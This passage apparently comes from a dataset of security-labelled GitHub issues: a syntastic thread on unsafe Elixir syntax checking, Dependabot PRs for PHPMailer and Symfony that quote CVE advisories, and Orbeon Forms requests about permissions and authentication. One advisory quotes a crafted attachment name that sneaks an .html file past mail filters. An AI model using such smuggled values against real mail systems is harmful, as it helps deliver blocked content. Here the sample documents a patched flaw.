> If not, can someone point me to an example of where the script should go and how I set `makeprg` to the correct path?

The `erlang/escript` is a good exemple.  But if you write the script I can take care of the details.
@ericlathrop: One more thing: the existing checker also uses `mix`.  Can you please explain how would this come into play, keeping in mind that to me ""elixir"" is stuff that belongs in some alchemist's olde bottle?
@lcd047 Okay, I'll work on adding error checking and pushing this further along. I just started a new job so it may take a week or two. I think `mix` is a project build tool, but I haven't used it because I'm just learning elixir. I'm only on Chapter 6 of the book, so I haven't gotten to mix yet.
For me the current elixir syntax check is a problem because it compiles the files. The phoenix framework has a nice feature of doing a code reloading on runtime. On page requests it checks if there are files that need to be compiled, if there is it compiles them and loads the code before it serves the request. But when i save the file with vim the syntax check compiles the file, which causes phoenix not to pick it up.
@lcd047 mix is the Elixir build tool and task runner, it is part of the standard library/distribution.
For those new to the thread, a summary:
1. To enable the built-in Elixir checker you need both `let g:syntastic_elixir_checkers = ['elixir']` and `let g:syntastic_enable_elixir_checker = 1`.
2. The existing elixir checker [here in syntastic](https://github.com/scrooloose/syntastic/blob/4708cdd/syntax_checkers/elixir/elixir.vim#L32) goes looking for a `mix.exs` file (indicating a mix project) and then either runs `elixir __.ex` or `mix compile mix.exs`.
3. If you set `let g:syntastic_elixir_elixir_args = '+elixirc'` you'll get behavior equivalent to `elixirc __.ex` (and `mix compile +elixirc mix.exs` won't complain).
4. All these commands execute some code, not just ""compile"" it.
5. Several write lots of files locally.
6. Furthermore, the error formats [are subject to change](https://github.com/elixir-lang/elixir/blob/f240f45ed6072c50a559c46a19f3732623f09851/lib/elixir/lib/exception.ex#L10)  and not parsed ideally yet.

It sounds to me like leaving it disabled by default is still the right thing.  :(

And we could use a tool which was safe to run and provided an easier-to-parse output.  Have @ericlathrop (how's the new job?) or @mattly (who filed https://github.com/elixir-lang/elixir/issues/3282) had any luck with anything yet? :)
I've had a lot going on in my life lately, and have been doing a lot of learning and working with Clojure for $dayjob, and haven't had time to pursue this beyond this example I posted to flycheck/flycheck#630 :

``` sh
elixir -e 'r = System.argv |> List.first |> File.read! |> Code.string_to_quoted; if elem(r, 0) == :error do IO.inspect(elem(r,1)); end' -- filename.ex
```
That's similar to what I'm doing in my linter project, and it works quite nicely.
@lpil I presume you're referring to [dogma](https://github.com/lpil/dogma).  Then perhaps the solution is to add a checker for `dogma`, and leave the `elixir` checker as it is?
That's the one :)

While I intend to make a syntastic compatible formatter, I think we still need a plain Elixir checker for the following reasons:
- Dogma is still in alpha. I'm likely going to break the API repeatedly before v1.0.0, and there are several problems that I don't know how to solve yet.
- Dogma lints style as well as correctness, and is probably far too opinionated to be used as the default syntactic Elixir linter.  Think more JSCS than jshint.
@nathanl  `.()` is a syntax for executing functions inside `IEX` and it will run when called or when you try to compile a script (.exs). Try to play with it as a module instead. Just tested syntastic (on a `mix` project) here with a very long calculation and just syntax was checked. Really cool.

But keep in mind that, since complier is not running, you may have warnings on variables (especially when using `patter matching`), that will broke your code when fixed.

Couldn't find any problems using syntastic so far. 
That's not correct, it is the syntax for calling an anonymous function. The syntax in iex is the same as anywhere else.

What problems with pattern matching have you encountered? There should be no difference.
Does this issue still exist?Yes. Syntastic currently compiles (and thus executes) Elixir code in order to check the syntax.

A safer and more performant solution would be to check the syntax with the Elixir parser, which is distributed with the language.**Update** Dogma is deprecated and syntax checking is now built-in:

`mix format --dry-run {{filename}}`Hiya. As the creator of dogma I'd recommend switching to what @steakknife suggests, dogma is deprecated and the current approach to checking syntax is unsafe.Great.  Now, in order for this to actually happen, one of you guys can either post a PR, or explain for the non-initiated (i.e. for yours truly):

* how syntastic can check that the installed elixir version supports the new options
* how checking the current file is supposed to happen, and
* what parts of the existing baggage can be discarded.

Posting some test files producing representative error messages would be nice, too.Formatting is considered correct or incorrect on an entire file basis, so no error messages will be given. It's similar to gofmt, rust-format, etc in this respect.

This was introduced in Elixir 1.6, though rather than booting the VM to check this I would instead run the command above and check for whether it wasn't recognised by checking the exit status and the content of stderr. This will be faster as you don't need to boot the VM twice.

Given the entire ecosystem is now using the formatter I'd probably not worry about older versions that do not have it.Well, I suppose this leaves the other option.  Working PRs are welcome.@lpil 1.6+ [looks right](https://hashrocket.com/blog/posts/format-your-elixir-code-now). Here's a script based on suggestions. Verified that error output is always on stderr.

```Elixir
#!/usr/bin/env elixir
if Version.match?(System.version(), "">=1.6.0"") do
  Mix.State.start_link(nil)
  Mix.ProjectStack.start_link(nil)
  Mix.Tasks.Format.run(System.argv() ++ [""--dry-run""])
else
  :erlang.error(""Upgrade elixir to 1.6+ to enable vim-syntastic syntax checking"")
end
```

TGIF and awesome Labor Day weekend depending",no,"security,"
opencats/OpenCATS,922936033,"[Security] Bump phpmailer/phpmailer from 6.0.7 to 6.5.0","Bumps [phpmailer/phpmailer](https://github.com/PHPMailer/PHPMailer) from 6.0.7 to 6.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-3603.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Untrusted code may be run from an overridden address validator</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-34551.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>RCE affecting Windows hosts via UNC paths to translation files</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-f7hx-fqxw-rvvj"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Insufficient output escaping of attachment names in PHPMailer</strong></p>
<h3>Impact</h3>
<p>CWE-116: Incorrect output escaping.</p>
<p>An attachment added like this (note the double quote within the attachment name, which is entirely valid):</p>
<pre><code>$mail-&amp;gt;addAttachment('/tmp/attachment.tmp', 'filename.html&quot;;.jpg');
</code></pre>
<p>Will result in a message containing these headers:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html&quot;;.jpg&quot;
Content-Disposition: attachment; filename=&quot;filename.html&quot;;.jpg&quot;
</code></pre>
<p>The attachment will be named <code>filename.html</code>, and the trailing <code>&quot;;.jpg&quot;</code> will be ignored. Mail filters that reject <code>.html</code> attachments but permit <code>.jpg</code> attachments may be fooled by this.</p>
<p>Note that the MIME type itself is obtained automatically from the <em>source filename</em> (in this case <code>attachment.tmp</code>, which maps to a generic <code>application/octet-stream</code> type), and not the <em>name</em> given to the attachment (though these are the same if a separate name is not provided), though it can be set explicitly in other parameters to attachment methods.</p>
<h3>Patches</h3>
<p>Patched in PHPMailer 6.1.6 by escaping double quotes within the name using a backslash, as per RFC822 section 3.4.1, resulting in correctly escaped headers like this:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html\&quot;;.jpg&quot;
</code></pre>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 6.1.6</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/releases"">phpmailer/phpmailer's releases</a>.</em></p>
<blockquote>
<h2>PHPMailer 6.5.0</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<p>Thanks to Vikrant Singh Chauhan, listensec.com, and the WordPress security team for reporting and assistance with this release.</p>
<h2>PHPMailer 6.4.1</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<p>Thanks to Fariskhi Vidyan for the report and assistance, and Tidelift for support.</p>
<h2>PHPMailer 6.4.0</h2>
<p>This is a maintenance release. The changes introduced in 6.3.0 for setting an envelope sender automatically when using <code>mail()</code> caused problems, <a href=""https://core.trac.wordpress.org/ticket/52822"">especially in WordPress</a>, so this change has been reverted. It gets a minor version bump as it's a change in behaviour, but only back to what 6.2.0 did. See <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">#2298</a> for more info.</p>
<p>Other changes:</p>
<ul>
<li>Check for the mbstring extension before decoding addresss in <code>parseAddress</code>, so it won't fail if you don't have it installed</li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in <a href=""https://tidelift.com"">Tidelift</a>, because supporting open-source is important!</li>
</ul>
<h2>PHPMailer 6.3.0</h2>
<p>This is a maintenance release.</p>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>PHPMailer 6.2.0</h2>
<p>This is a maintenance release. With this release, PHPMailer gains official PHP 8 compatibility; earlier versions worked in PHP 8 pre-releases, but the test suite did not. The considerable rework this required (which also restored tests running on older PHP versions) was done by <a href=""https://github.com/jrfnl""><code>@​jrfnl</code></a> – thank you very much!</p>
<ul>
<li>PHP 8.0 compatibility</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md"">phpmailer/phpmailer's changelog</a>.</em></p>
<blockquote>
<h2>Version 6.5.0 (June 16th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<h2>Version 6.4.1 (April 29th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<h2>Version 6.4.0 (March 31st, 2021)</h2>
<ul>
<li>Revert change that made the <code>mail()</code> and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">PHPMailer/PHPMailer#2298</a></li>
<li>Check for mbstring extension before decoding addresss in <code>parseAddress</code></li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in Tidelift</li>
</ul>
<h2>Version 6.3.0 (February 19th, 2021)</h2>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>Version 6.2.0</h2>
<ul>
<li>PHP 8.0 compatibility, many thanks to <a href=""https://github.com/jrf""><code>@​jrf</code></a>_nl!</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
<li>Avoid warnings when using old openssl functions</li>
<li>Improve Travis-CI build configuration</li>
</ul>
<h2>Version 6.1.8 (October 9th, 2020)</h2>
<ul>
<li>Mark <code>ext-hash</code> as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose</li>
<li>Make file upload examples safer</li>
<li>Update links to SMTP testing servers</li>
<li>Avoid errors when set_time_limit is disabled (you need better hosting!)</li>
<li>Allow overriding auth settings for local tests; makes it easy to run tests using HELO</li>
<li>Recover gracefully from errors during keepalive sessions</li>
<li>Add AVIF MIME type mapping</li>
<li>Prevent duplicate <code>To</code> headers in BCC-only messages when using <code>mail()</code></li>
<li>Avoid file function problems when attaching files from Windows UNC paths</li>
<li>Improve German, Bahasa Indonesian, Filipino translations</li>
<li>Add Javascript-based example</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/a5b5c43e50b7fba655f793ad27303cd74c57363c""><code>a5b5c43</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/e121da364fbf25d861f8131e4c742ab875f1444e""><code>e121da3</code></a> Merge branch 'master' of <a href=""https://github.com/PHPMailer/PHPMailer"">https://github.com/PHPMailer/PHPMailer</a></li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/74e512aa750f8f9a2a927161706c5027a3aefb76""><code>74e512a</code></a> Security update</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/acd264bf17ff4ac5c915f0d4226dce8a9ea70bc3""><code>acd264b</code></a> Merge branch 'CVE-2021-34551'</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/0063f83e8ccdd46faa473c541f7dd8ba46ebc37a""><code>0063f83</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/707205f25572332079b8c77c06a26d4ebb54d90f""><code>707205f</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/1047838e84c8ec99c566c9a52336d9dbddd4e333""><code>1047838</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/c2f191be6bd6ba6a62cd899a7cce409da9651a85""><code>c2f191b</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/45f3c18dc6a2de1cb1bf49b9b249a9ee36a5f7f3""><code>45f3c18</code></a> Deny string-based callables altogether</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/6334bab2affb132b1445825a0f1f82f7869b981e""><code>6334bab</code></a> CVE docs</li>
<li>Additional commits viewable in <a href=""https://github.com/PHPMailer/PHPMailer/compare/v6.0.7...v6.5.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=6.0.7&new-version=6.5.0)](https://dependabot.com/compatibility-score/?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=6.0.7&new-version=6.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","@dependabot rebase",yes,"dependencies,security,"
opencats/OpenCATS,522653005,"[Security] Bump symfony/dependency-injection from 2.8.11 to 2.8.52","Bumps [symfony/dependency-injection](https://github.com/symfony/dependency-injection) from 2.8.11 to 2.8.52. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>

*Sourced from [The PHP Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/dependency-injection/CVE-2019-10910.yaml).*

> **CVE-2019-10910: Check service IDs are valid**
> 
> Affected versions: >=2.7.0, <2.7.51; >=2.8.0, <2.8.50; >=3.0.0, <3.1.0; >=3.1.0, <3.2.0; >=3.2.0, <3.3.0; >=3.3.0, <3.4.0; >=3.4.0, <3.4.26; >=4.0.0, <4.1.0; >=4.1.0, <4.1.12; >=4.2.0, <4.2.7

</details>
<details>
<summary>Commits</summary>

- [`c306198`](https://github.com/symfony/dependency-injection/commit/c306198fee8f872a8f5f031e6e4f6f83086992d8) security #cve-2019-10910 [DI] Check service IDs are valid (nicolas-grekas)
- [`a2f40df`](https://github.com/symfony/dependency-injection/commit/a2f40df187f0053bc361bcea3b27ff2b85744d9f) Bump phpunit XSD version to 5.2
- [`8b7508c`](https://github.com/symfony/dependency-injection/commit/8b7508c6af29f69426d2931466db2144d0f8105c) Skip empty proxy code
- [`bc5e7d8`](https://github.com/symfony/dependency-injection/commit/bc5e7d8b064e484d26dedcb5e8ef8cd5e0f8725b) [CS] Enforces null type hint on last position in phpDocs
- [`8421939`](https://github.com/symfony/dependency-injection/commit/84219396d1a79d149a5a9d5f71afaf48dcfde7d0) Consistently throw exceptions on a single line
- [`1607759`](https://github.com/symfony/dependency-injection/commit/16077591cd1541b6978c17160b1acff529fe7abf) minor [#28301](https://github-redirect.dependabot.com/symfony/dependency-injection/issues/28301) Fix code examples in PHPDoc (maidmaid)
- [`01b722a`](https://github.com/symfony/dependency-injection/commit/01b722a7528f99ffe6bfde1080090157a47b5e68) [DI] Fix phpdoc
- [`700bdb3`](https://github.com/symfony/dependency-injection/commit/700bdb339574dcf449f650b14312516cf3587f24) Fix code examples in PHPDoc
- [`2b41cf2`](https://github.com/symfony/dependency-injection/commit/2b41cf2ff42c504374b53347dd0ed69ed968583d) [HttpKernel] Fix inheritdocs
- [`ad2446d`](https://github.com/symfony/dependency-injection/commit/ad2446d39d11c3daaa7f147d957941a187e47357) Enable native_constant_invocation CS fixer
- Additional commits viewable in [compare view](https://github.com/symfony/dependency-injection/compare/v2.8.11...v2.8.52)
</details>
<br />

[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=symfony/dependency-injection&package-manager=composer&previous-version=2.8.11&new-version=2.8.52)](https://dependabot.com/compatibility-score.html?dependency-name=symfony/dependency-injection&package-manager=composer&previous-version=2.8.11&new-version=2.8.52)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
orbeon/orbeon-forms,174137412,"Separate Form Builder and Home page permissions","Currently, `form-builder-permissions.xml` controls:
- Form Builder
  - whether the user can create/edit/publish a form definition with a given app name
- Home page
  - whether the user has ""admin"" permissions on a form definition, which includes
    - making available/unavailable
    - pushing/pulling
    - upgrading

This also enables the ""Reindex"" button (see #2905).

Instead, we would like to have separate permissions, expressed in a consistent way:
- whether the user has CRUD access to a given form definition
  - would be like general CRUD permissions, but applied to `orbeon/builder`
  - see also #1149
- whether the user has `publish` access to the form definition
  - can apply to Form Builder and the Home page
  - could cover making available/unavailable, push/pull, and upgrading
- whether the user has a general `admin` permission (see #2905)

This is similar to #1149, but the latter was about handling the `form` permission attribute.

Might require implementing #1487.
","With #1860, we want to have per-app and global permissions configuration. This would enable setting permission for `orbeon/builder` in the properties.
",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,150145000,"Ability to encrypt passwords in property files","It's unclear how we can do this generally. One idea would be to provide a Java API so that users can provide their own password decryption.

[+1 from customer](https://basecamp.com/1721271/projects/5368955/messages/56630735#comment_408756928)
","[+1 from customer](https://3.basecamp.com/3600924/buckets/2825555/messages/1792781553#__recording_1887687129)

I thought @avernet had done some research on using a library to do that.One idea is to support Key Management Systems (KMS), specifically Amazon KMS and Google Cloud KMS, and we would access those systems through Tink (see [KMS support in Tink](https://github.com/google/tink/blob/master/docs/KEY-MANAGEMENT.md#key-management-systems)). [+1 from customer](https://3.basecamp.com/3600924/buckets/2192969/messages/1971791645)[+1 from customer](https://3.basecamp.com/3600924/buckets/3237397/messages/4208628234)",no,"Module: Form Builder,Type: RFE,Area: Security,"
orbeon/orbeon-forms,405460023,"FormRunnerPersistence.readFormMetadata doesn't use version","This eventually retrieves the form definition metadata, but it doesn't use the specific form definition version. This means that it uses the latest published version always. This is wrong, as permissions could be different between form definition versions.",,no,"Module: Form Runner,Area: Security,"
orbeon/orbeon-forms,435898788,"Check list of CVE provided by user","[+1 from user](http://discuss.orbeon.com/Version-2016-3-CE-Vulnerabilities-td4664531.html)","- [bcprov-jdk14 1.4](https://www.cvedetails.com/vulnerability-list/vendor_id-7637/Bouncycastle.html)
- [commons-beanutils 1.8.3](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-33761/Apache-Commons-Beanutils.html)
- [commons-fileupload 1.2.2](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-24746/version_id-143023/Apache-Commons-Fileupload-1.2.2.html)
- [jgroups 2.2.6](https://www.cvedetails.com/vulnerability-list/vendor_id-12875/Jgroups.html)
- [org.apache.httpcomponents 4.3.5](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-20943/Apache-Httpclient.html)
- [org.apache.xmlgraphics 1.0](https://www.cvedetails.com/cve/CVE-2017-5661/)
- [xml-xerces 2.11.0](https://snyk.io/vuln/maven:xerces:xercesImpl)
",no,"Area: Security,"
orbeon/orbeon-forms,14284432,"Upload: use Servlet 3 API when supported","See #985 for background information.

The idea here is that the container has the ability to close the connection. But this has to be verified, at least with Tomcat.

A quick glance at Tomcat sources seems to indicate that a file upload, when [`swallowAbortedUploads`](http://tomcat.apache.org/tomcat-7.0-doc/config/context.html) is set to `false` (which is _not_ the default!), will promptly close the connection. See [`Request.java`](https://github.com/apache/tomcat/blob/7f616f97067b8e3461f8611f9d26f0b262c4351f/java/org/apache/catalina/connector/Request.java#L768) as a starting point.

In short:
- using Tomcat 7
- with `swallowAbortedUploads` is set to `false`
- and Orbeon Forms using the Servlet 3 upload API

would be an improvement over the current situation, where the connection cannot be closed.

Drawbacks:
- support for pre-Servlet 3 containers
- does not resolve handling non multipart large request bodies (like a POST to a service)
","Servlet 3.0 API is no longer an issue as it is now many years old and widely supported.",no,"Module: XForms,Area: Security,Area: Performance,"
orbeon/orbeon-forms,180347586,"Support easy built-in user/authentication management","One option would be, for Orbeon Forms PE only, we could possibly bundle [Keycloak](http://www.keycloak.org/). This is probably not the only option. This could have a lot of value for some PE customers.

[+1 from evaluator](https://mail.google.com/mail/u/0/#inbox/15778615a458c81f)
","I saw this mentioned on the mailing list. I would love to see something like this bundled with PE. Currently we are using Liferay to provide registration and access to a form, but it is significantly more powerful than we need. I took a quick glance at KeyCloak and it looked more along the lines of a CAS replacement than a lightweight user management system.
@acspike Have you seen any other system? KeyCloak looked pretty good to us, but we haven't investigated in details yet. What would you consider an alternative if anything? Something built into Orbeon Forms proper?
I haven't seen anything else. I tried to look into Spring and Shiro a little bit. But to be honest, most of the words don't make sense to me when I read about products in the Java ecosystem.

I'm very thankful that you or Alessandro suggested Liferay and it has been working. But I live in fear because it is a complicated system and they tend to break in unexpected ways. One nice thing that Liferay allows for that wouldn't necessarily be available without the full blown portal solution is exposing particular forms along with additional information or instruction.

I'll continue to read up on KeyCloak. Thanks for suggesting another option.
You are welcome! I am pretty sure that KeyCloak is more lightweight than Liferay as it is dedicated to just identity/access, while Liferay does so much more (including things lots of users don't need). Let's keep looking into this.
[+1 from Twitter](https://twitter.com/cameronelliott1/status/1140669894624600064)I am nobody to tell you where to take Orbeon, but as an outsider it seems like one of the more mature options for building chunks of web applications, and in my case I don't already have an existing auth or identity system in place, so if Orbeon had a simple tightly integrated auth package, so the whole ball of wax could be used to quickly build forms applications with user account support being very simple to do, it seems like Orbeon would be natural for even more forms based applications.
Maybe mostly everybody who looks at Orbeon already has an auth system in-place? Don't know, but for my situation, it would really make Orbeon very useful. 
Regards.@cameron-elliott Many Orbeon users indeed already have a user management system. Of course, we agree that it would be nice if we could provide an out of the box option for those who don't have one, hence this RFE. Thanks for the feedback!",no,"Module: Form Runner,Type: RFE,Area: Security,"
orbeon/orbeon-forms,604207952,"Improve authentication/authorization support","This is a general issue. Possible improvements:

- Configuration UI
- LDAP / SAML / OAuth

Suggestions:

- Liferay UI
- [JFrog](https://www.jfrog.com/confluence/display/JFROG/Security)

See also:

- Provide API and/or UI for credentials #3660
- Ability to control services accessible by Form Builder/Form Runner #4397
- Support OAuth for calling services #2972

